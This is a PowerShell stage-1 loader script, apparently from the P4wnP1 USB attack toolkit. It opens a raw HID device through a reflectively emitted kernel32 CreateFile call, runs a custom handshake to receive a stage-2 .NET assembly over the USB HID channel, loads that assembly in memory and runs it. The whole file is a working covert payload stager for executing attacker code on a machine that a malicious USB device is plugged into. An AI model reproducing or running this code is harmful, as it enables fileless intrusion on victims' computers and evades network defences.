
if (-not $USB_VID) {$USB_VID="1D6B"}
if (-not $USB_PID) {$USB_PID="0437"}
function ReflectCreateFileMethod()
{
$dom = [AppDomain]::CurrentDomain
$da = New-Object Reflection.AssemblyName("MaMe82DynAssembly")
$ab = $dom.DefineDynamicAssembly($da, [Reflection.Emit.AssemblyBuilderAccess]::Run)
$mb = $ab.DefineDynamicModule("MaMe82DynModule", $False)
$tb = $mb.DefineType("MaMe82", "Public, Class")
$cfm = $tb.DefineMethod("CreateFile", [Reflection.MethodAttributes] "Public, Static", [IntPtr], [Type[]] @([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr] ))
$cdi = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
$cfa = [Reflection.FieldInfo[]] @([Runtime.InteropServices.DllImportAttribute].GetField("EntryPoint"), [Runtime.InteropServices.DllImportAttribute].GetField("PreserveSig"), 
[Runtime.InteropServices.DllImportAttribute].GetField("SetLastError"), [Runtime.InteropServices.DllImportAttribute].GetField("CallingConvention"), 
[Runtime.InteropServices.DllImportAttribute].GetField("CharSet"))
$cffva = [Object[]] @("CreateFile", $True, $True, [Runtime.InteropServices.CallingConvention]::Winapi, [Runtime.InteropServices.CharSet]::Auto)
$cfca = New-Object Reflection.Emit.CustomAttributeBuilder($cdi, @("kernel32.dll"), $cfa, $cffva)
$cfm.SetCustomAttribute($cfca)
$tb.CreateType()
}
function CreateFileStreamFromDevicePath($mmcl, [String] $path)
{
$h = $mmcl::CreateFile($path, [Int32]0XC0000000, [IO.FileAccess]::ReadWrite, [IntPtr]::Zero, [IO.FileMode]::Open, [UInt32]0x40000000, [IntPtr]::Zero)
$a = $h, [Boolean]0
$c=[Microsoft.Win32.SafeHandles.SafeFileHandle].GetConstructors()[0]
$h = $c.Invoke($a)
$fa=[IO.FileAccess]::ReadWrite
$a=$h, $fa, [Int32]64, [Boolean]1
$c=[IO.FileStream].GetConstructors()[14]
return $c.Invoke($a)
}
function GetDevicePath($USB_VID, $USB_PID)
{
$HIDGuid="{4d1e55b2-f16f-11cf-88cb-001111000030}"
foreach ($wmidev in gwmi Win32_USBControllerDevice |%{[wmi]($_.Dependent)} ) {
if ($wmidev.DeviceID -match ("$USB_VID" + '&PID_' + "$USB_PID") -and $wmidev.DeviceID -match ('HID') -and -not $wmidev.Service) {
$devpath = "\\?\" + $wmidev.PNPDeviceID.Replace('\','#') + "#" + $HIDGuid
}
}
$devpath
}
function RequestStage2 ($HIDin, $HIDout) {
$connect_req = New-Object Byte[] (65)
$response = New-Object Byte[] (65)
$connect_req[2] = $connect_req[2] -bor 128
[Console]::WriteLine("Stage1: Starting connection synchronization..")
$connected = $false
while (-not $connected)
{
$HIDout.Write($connect_req, 0, 65)
[Console]::WriteLine("Stage1: Connect request sent")
$cr = $HIDin.Read($response, 0, 65)
$SEQ = $response[2] -band 63
$CONNECT_BIT = $response[2] -band 128
if ($CONNECT_BIT)
{
[Console]::WriteLine("Satge1: Synced to SEQ number {0}" -f $SEQ)
$connect_req[2] = $connect_req[2] -bor $SEQ
$HIDout.Write($connect_req, 0, 65)
break
}
}
$cr = $HIDin.Read($response, 0, 65)
$SEQ = $response[2] -band 63
$ACK = $SEQ
$CTRL_CHANNEL = [BitConverter]::GetBytes([uint32] 0)
$CTRL_MSG_STAGE2_REQUEST = [BitConverter]::GetBytes([uint32] 1)
if ([System.BitConverter]::IsLittleEndian) {[array]::Reverse($CTRL_MSG_STAGE2_REQUEST) }
$payload = $CTRL_CHANNEL + $CTRL_MSG_STAGE2_REQUEST
$LEN = $payload.Length
$FIN_BIT = (1 -shl 7)
$stage2request = [Byte[]](0, ($LEN -bor $FIN_BIT), $ACK) + $payload + (New-Object byte[] (62 - $LEN))
$HIDout.Write($stage2request, 0, 65)
$stage2 = $null
$STREAM_TYPE_STAGE2_RESPONSE = [uint32] 1000
while ($true)
{
$cr = $HIDin.Read($response, 0, 65)
$SEQ = $response[2] -band 63
$LEN = $response[1] -band 63
if ($LEN -gt 0)
{
if ($stage2 -eq $null)
{
$channel = $response[3..6]
$MSG_TYPE = $response[7..10]
if ([BitConverter]::IsLittleEndian) { [array]::Reverse($channel); [array]::Reverse($MSG_TYPE) }
$channel = [BitConverter]::ToUInt32($channel, 0)
$MSG_TYPE = [BitConverter]::ToUInt32($MSG_TYPE, 0)
$host.UI.WriteLine("Stage 1: CTRL MSG Type {0}" -f $MSG_TYPE)
if (($channel -eq [Uint32]0) -and ($MSG_TYPE -eq $STREAM_TYPE_STAGE2_RESPONSE))
{
$stage2 = $response[11..(2+$LEN)]
}
}
else
{
$stage2 += $response[3..(2+$LEN)]
$host.UI.Write(".")
}
$FIN_BIT = $response[1] -band 128
if ($FIN_BIT -and $stage2 -ne $null) { break }
}
$request = New-Object Byte[] 65
$ACK = $SEQ
$request[2] = $ACK
$HIDout.Write($request, 0, 65)
}
return [byte[]] $stage2
}
$mmcl = ReflectCreateFileMethod
$path= GetDevicePath $USB_VID $USB_PID
$dev = CreateFileStreamFromDevicePath $mmcl $path
$stage2 = RequestStage2 $dev $dev
[System.Reflection.Assembly]::Load([byte[]]$stage2)
[P4wnP1.Runner]::run($dev, $dev)

